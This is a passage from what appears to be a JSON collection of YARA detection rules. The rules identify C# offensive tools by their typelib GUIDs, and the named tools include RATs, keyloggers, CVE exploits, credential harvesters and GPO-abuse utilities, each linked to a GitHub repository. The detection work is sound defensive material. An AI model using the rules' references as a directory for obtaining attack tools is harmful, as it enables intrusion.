  "HKTL_NET_GUID_TheHackToolBoxTeek": "rule HKTL_NET_GUID_TheHackToolBoxTeek {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/teeknofil/TheHackToolBoxTeek\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"2aa8c254-b3b3-469c-b0c9-dcbe1dd101c0\" ascii nocase wide\n        $typelibguid1 = \"afeff505-14c1-4ecf-b714-abac4fbd48e7\" ascii nocase wide\n        $typelibguid2 = \"4cf42167-a5cf-4b2d-85b4-8e764c08d6b3\" ascii nocase wide\n        $typelibguid3 = \"118a90b7-598a-4cfc-859e-8013c8b9339c\" ascii nocase wide\n        $typelibguid4 = \"3075dd9a-4283-4d38-a25e-9f9845e5adcb\" ascii nocase wide\n        $typelibguid5 = \"295655e8-2348-4700-9ebc-aa57df54887e\" ascii nocase wide\n        $typelibguid6 = \"74efe601-9a93-46c3-932e-b80ab6570e42\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_USBTrojan": "rule HKTL_NET_GUID_USBTrojan {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mashed-potatoes/USBTrojan\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4eee900e-adc5-46a7-8d7d-873fd6aea83e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_IIS_backdoor": "rule HKTL_NET_GUID_IIS_backdoor {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/WBGlIl/IIS_backdoor\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3fda4aa9-6fc1-473f-9048-7edc058c4f65\" ascii nocase wide\n        $typelibguid1 = \"73ca4159-5d13-4a27-8965-d50c41ab203c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_ShellGen": "rule HKTL_NET_GUID_ShellGen {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jasondrawdy/ShellGen\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c6894882-d29d-4ae1-aeb7-7d0a9b915013\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Mass_RAT": "rule HKTL_NET_GUID_Mass_RAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Mass-RAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"6c43a753-9565-48b2-a372-4210bb1e0d75\" ascii nocase wide\n        $typelibguid1 = \"92ba2a7e-c198-4d43-929e-1cfe54b64d95\" ascii nocase wide\n        $typelibguid2 = \"4cb9bbee-fb92-44fa-a427-b7245befc2f3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Browser_ExternalC2": "rule HKTL_NET_GUID_Browser_ExternalC2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/Browser-ExternalC2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"10a730cd-9517-42d5-b3e3-a2383515cca9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_OffensivePowerShellTasking": "rule HKTL_NET_GUID_OffensivePowerShellTasking {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/leechristensen/OffensivePowerShellTasking\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"d432c332-3b48-4d06-bedb-462e264e6688\" ascii nocase wide\n        $typelibguid1 = \"5796276f-1c7a-4d7b-a089-550a8c19d0e8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_DoHC2": "rule HKTL_NET_GUID_DoHC2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SpiderLabs/DoHC2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9877a948-2142-4094-98de-e0fbb1bc4062\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SyscallPOC": "rule HKTL_NET_GUID_SyscallPOC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SolomonSklash/SyscallPOC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1e54637b-c887-42a9-af6a-b4bd4e28cda9\" ascii nocase wide\n        $typelibguid1 = \"198d5599-d9fc-4a74-87f4-5077318232ad\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Pen_Test_Tools": "rule HKTL_NET_GUID_Pen_Test_Tools {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/awillard1/Pen-Test-Tools\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"922e7fdc-33bf-48de-bc26-a81f85462115\" ascii nocase wide\n        $typelibguid1 = \"ad5205dd-174d-4332-96d9-98b076d6fd82\" ascii nocase wide\n        $typelibguid2 = \"b67e7550-f00e-48b3-ab9b-4332b1254a86\" ascii nocase wide\n        $typelibguid3 = \"5e95120e-b002-4495-90a1-cd3aab2a24dd\" ascii nocase wide\n        $typelibguid4 = \"295017f2-dc31-4a87-863d-0b9956c2b55a\" ascii nocase wide\n        $typelibguid5 = \"abbaa2f7-1452-43a6-b98e-10b2c8c2ba46\" ascii nocase wide\n        $typelibguid6 = \"a4043d4c-167b-4326-8be4-018089650382\" ascii nocase wide\n        $typelibguid7 = \"51abfd75-b179-496e-86db-62ee2a8de90d\" ascii nocase wide\n        $typelibguid8 = \"a06da7f8-f87e-4065-81d8-abc33cb547f8\" ascii nocase wide\n        $typelibguid9 = \"ee510712-0413-49a1-b08b-1f0b0b33d6ef\" ascii nocase wide\n        $typelibguid10 = \"9780da65-7e25-412e-9aa1-f77d828819d6\" ascii nocase wide\n        $typelibguid11 = \"7913fe95-3ad5-41f5-bf7f-e28f080724fe\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_The_Collection": "rule HKTL_NET_GUID_The_Collection {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Tlgyt/The-Collection\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"579159ff-3a3d-46a7-b069-91204feb21cd\" ascii nocase wide\n        $typelibguid1 = \"5b7dd9be-c8c3-4c4f-a353-fefb89baa7b3\" ascii nocase wide\n        $typelibguid2 = \"43edcb1f-3098-4a23-a7f2-895d927bc661\" ascii nocase wide\n        $typelibguid3 = \"5f19919d-cd51-4e77-973f-875678360a6f\" ascii nocase wide\n        $typelibguid4 = \"17fbc926-e17e-4034-ba1b-fb2eb57f5dd3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Change_Lockscreen": "rule HKTL_NET_GUID_Change_Lockscreen {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nccgroup/Change-Lockscreen\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"78642ab3-eaa6-4e9c-a934-e7b0638bc1cc\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_LOLBITS": "rule HKTL_NET_GUID_LOLBITS {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Kudaes/LOLBITS\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"29d09aa4-ea0c-47c2-973c-1d768087d527\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Keylogger": "rule HKTL_NET_GUID_Keylogger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BlackVikingPro/Keylogger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"7afbc9bf-32d9-460f-8a30-35e30aa15879\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_CVE_2020_1337": "rule HKTL_NET_GUID_CVE_2020_1337 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/neofito/CVE-2020-1337\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"d9c2e3c1-e9cc-42b0-a67c-b6e1a4f962cc\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpLogger": "rule HKTL_NET_GUID_SharpLogger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/djhohnstein/SharpLogger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"36e00152-e073-4da8-aa0c-375b6dd680c4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_AsyncRAT_C_Sharp": "rule HKTL_NET_GUID_AsyncRAT_C_Sharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"619b7612-dfea-442a-a927-d997f99c497b\" ascii nocase wide\n        $typelibguid1 = \"424b81be-2fac-419f-b4bc-00ccbe38491f\" ascii nocase wide\n        $typelibguid2 = \"37e20baf-3577-4cd9-bb39-18675854e255\" ascii nocase wide\n        $typelibguid3 = \"dafe686a-461b-402b-bbd7-2a2f4c87c773\" ascii nocase wide\n        $typelibguid4 = \"ee03faa9-c9e8-4766-bd4e-5cd54c7f13d3\" ascii nocase wide\n        $typelibguid5 = \"8bfc8ed2-71cc-49dc-9020-2c8199bc27b6\" ascii nocase wide\n        $typelibguid6 = \"d640c36b-2c66-449b-a145-eb98322a67c8\" ascii nocase wide\n        $typelibguid7 = \"8de42da3-be99-4e7e-a3d2-3f65e7c1abce\" ascii nocase wide\n        $typelibguid8 = \"bee88186-769a-452c-9dd9-d0e0815d92bf\" ascii nocase wide\n        $typelibguid9 = \"9042b543-13d1-42b3-a5b6-5cc9ad55e150\" ascii nocase wide\n        $typelibguid10 = \"6aa4e392-aaaf-4408-b550-85863dd4baaf\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_DarkFender": "rule HKTL_NET_GUID_DarkFender {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xyg3n/DarkFender\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"12fdf7ce-4a7c-41b6-9b32-766ddd299beb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_IronKit": "rule HKTL_NET_GUID_IronKit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nshalabi/IronKit\"\n        author = \"Arnim Rupp\"\n        score = 50\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"68e40495-c34a-4539-b43e-9e4e6f11a9fb\" ascii nocase wide\n        $typelibguid1 = \"641cd52d-3886-4a74-b590-2a05621502a4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_MinerDropper": "rule HKTL_NET_GUID_MinerDropper {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/DylanAlloy/MinerDropper\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"46a7af83-1da7-40b2-9d86-6fd6223f6791\" ascii nocase wide\n        $typelibguid1 = \"8433a693-f39d-451b-955b-31c3e7fa6825\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpDomainSpray": "rule HKTL_NET_GUID_SharpDomainSpray {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/HunnicCyber/SharpDomainSpray\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"76ffa92b-429b-4865-970d-4e7678ac34ea\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_iSpyKeylogger": "rule HKTL_NET_GUID_iSpyKeylogger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mwsrc/iSpyKeylogger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"ccc0a386-c4ce-42ef-aaea-b2af7eff4ad8\" ascii nocase wide\n        $typelibguid1 = \"816b8b90-2975-46d3-aac9-3c45b26437fa\" ascii nocase wide\n        $typelibguid2 = \"279b5533-d3ac-438f-ba89-3fe9de2da263\" ascii nocase wide\n        $typelibguid3 = \"88d3dc02-2853-4bf0-b6dc-ad31f5135d26\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SolarFlare": "rule HKTL_NET_GUID_SolarFlare {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mubix/solarflare\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-15\"\n    strings:\n        $typelibguid0 = \"ca60e49e-eee9-409b-8d1a-d19f1d27b7e4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Snaffler": "rule HKTL_NET_GUID_Snaffler {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SnaffCon/Snaffler\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"2aa060b4-de88-4d2a-a26a-760c1cefec3e\" ascii nocase wide\n        $typelibguid1 = \"b118802d-2e46-4e41-aac7-9ee890268f8b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpShares": "rule HKTL_NET_GUID_SharpShares {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/djhohnstein/SharpShares/\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"fe9fdde5-3f38-4f14-8c64-c3328c215cf2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpEDRChecker": "rule HKTL_NET_GUID_SharpEDRChecker {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/PwnDexter/SharpEDRChecker\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-18\"\n    strings:\n        $typelibguid0 = \"bdfee233-3fed-42e5-aa64-492eb2ac7047\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpClipHistory": "rule HKTL_NET_GUID_SharpClipHistory {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FSecureLABS/SharpClipHistory\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"1126d5b4-efc7-4b33-a594-b963f107fe82\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpGPO_RemoteAccessPolicies": "rule HKTL_NET_GUID_SharpGPO_RemoteAccessPolicies {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FSecureLABS/SharpGPO-RemoteAccessPolicies\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"fbb1abcf-2b06-47a0-9311-17ba3d0f2a50\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Absinthe": "rule HKTL_NET_GUID_Absinthe {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cameronhotchkies/Absinthe\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"9936ae73-fb4e-4c5e-a5fb-f8aaeb3b9bd6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_ExploitRemotingService": "rule HKTL_NET_GUID_ExploitRemotingService {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tyranid/ExploitRemotingService\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"fd17ae38-2fd3-405f-b85b-e9d14e8e8261\" ascii nocase wide\n        $typelibguid1 = \"1850b9bb-4a23-4d74-96b8-58f274674566\" ascii nocase wide\n        $typelibguid2 = \"297cbca1-efa3-4f2a-8d5f-e1faf02ba587\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Xploit": "rule HKTL_NET_GUID_Xploit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/shargon/Xploit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"4545cfde-9ee5-4f1b-b966-d128af0b9a6e\" ascii nocase wide\n        $typelibguid1 = \"33849d2b-3be8-41e8-a1e2-614c94c4533c\" ascii nocase wide\n        $typelibguid2 = \"c2dc73cc-a959-4965-8499-a9e1720e594b\" ascii nocase wide\n        $typelibguid3 = \"77059fa1-4b7d-4406-bc1a-cb261086f915\" ascii nocase wide\n        $typelibguid4 = \"a4a04c4d-5490-4309-9c90-351e5e5fd6d1\" ascii nocase wide\n        $typelibguid5 = \"ca64f918-3296-4b7d-9ce6-b98389896765\" ascii nocase wide\n        $typelibguid6 = \"10fe32a0-d791-47b2-8530-0b19d91434f7\" ascii nocase wide\n        $typelibguid7 = \"679bba57-3063-4f17-b491-4f0a730d6b02\" ascii nocase wide\n        $typelibguid8 = \"0981e164-5930-4ba0-983c-1cf679e5033f\" ascii nocase wide\n        $typelibguid9 = \"2a844ca2-5d6c-45b5-963b-7dca1140e16f\" ascii nocase wide\n        $typelibguid10 = \"7d75ca11-8745-4382-b3eb-c41416dbc48c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_PoC": "rule HKTL_NET_GUID_PoC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/thezdi/PoC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"89f9d411-e273-41bb-8711-209fd251ca88\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpGPOAbuse": "rule HKTL_NET_GUID_SharpGPOAbuse {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FSecureLABS/SharpGPOAbuse\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"4f495784-b443-4838-9fa6-9149293af785\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Watson": "rule HKTL_NET_GUID_Watson {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/Watson\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"49ad5f38-9e37-4967-9e84-fe19c7434ed7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_StandIn": "rule HKTL_NET_GUID_StandIn {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FuzzySecurity/StandIn\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"01c142ba-7af1-48d6-b185-81147a2f7db7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_azure_password_harvesting": "rule HKTL_NET_GUID_azure_password_harvesting {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/guardicore/azure_password_harvesting\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"7ad1ff2d-32ac-4c54-b615-9bb164160dac\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_PowerOPS": "rule HKTL_NET_GUID_PowerOPS {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fdiskyou/PowerOPS\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"2a3c5921-7442-42c3-8cb9-24f21d0b2414\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Random_CSharpTools": "rule HKTL_NET_GUID_Random_CSharpTools {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/xorrior/Random-CSharpTools\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"f7fc19da-67a3-437d-b3b0-2a257f77a00b\" ascii nocase wide\n        $typelibguid1 = \"47e85bb6-9138-4374-8092-0aeb301fe64b\" ascii nocase wide\n        $typelibguid2 = \"c7d854d8-4e3a-43a6-872f-e0710e5943f7\" ascii nocase wide\n        $typelibguid3 = \"d6685430-8d8d-4e2e-b202-de14efa25211\" ascii nocase wide\n        $typelibguid4 = \"1df925fc-9a89-4170-b763-1c735430b7d0\" ascii nocase wide\n        $typelibguid5 = \"817cc61b-8471-4c1e-b5d6-c754fc550a03\" ascii nocase wide\n        $typelibguid6 = \"60116613-c74e-41b9-b80e-35e02f25891e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_CVE_2020_0668": "rule HKTL_NET_GUID_CVE_2020_0668 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/RedCursorSecurityConsulting/CVE-2020-0668\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"1b4c5ec1-2845-40fd-a173-62c450f12ea5\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_WindowsRpcClients": "rule HKTL_NET_GUID_WindowsRpcClients {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tyranid/WindowsRpcClients\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"843d8862-42eb-49ee-94e6-bca798dd33ea\" ascii nocase wide\n        $typelibguid1 = \"632e4c3b-3013-46fc-bc6e-22828bf629e3\" ascii nocase wide\n        $typelibguid2 = \"a2091d2f-6f7e-4118-a203-4cea4bea6bfa\" ascii nocase wide\n        $typelibguid3 = \"950ef8ce-ec92-4e02-b122-0d41d83065b8\" ascii nocase wide\n        $typelibguid4 = \"d51301bc-31aa-4475-8944-882ecf80e10d\" ascii nocase wide\n        $typelibguid5 = \"823ff111-4de2-4637-af01-4bdc3ca4cf15\" ascii nocase wide\n        $typelibguid6 = \"5d28f15e-3bb8-4088-abe0-b517b31d4595\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpFruit": "rule HKTL_NET_GUID_SharpFruit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rvrsh3ll/SharpFruit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"3da2f6de-75be-4c9d-8070-08da45e79761\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpWitness": "rule HKTL_NET_GUID_SharpWitness {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/SharpWitness\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"b9f6ec34-4ccc-4247-bcef-c1daab9b4469\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_RexCrypter": "rule HKTL_NET_GUID_RexCrypter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/syrex1013/RexCrypter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"10cd7c1c-e56d-4b1b-80dc-e4c496c5fec5\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharPersist": "rule HKTL_NET_GUID_SharPersist {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fireeye/SharPersist\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"9d1b853e-58f1-4ba5-aefc-5c221ca30e48\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_CVE_2019_1253": "rule HKTL_NET_GUID_CVE_2019_1253 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/padovah4ck/CVE-2019-1253\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"584964c1-f983-498d-8370-23e27fdd0399\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_scout": "rule HKTL_NET_GUID_scout {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jaredhaight/scout\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"d9c76e82-b848-47d4-8f22-99bf22a8ee11\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
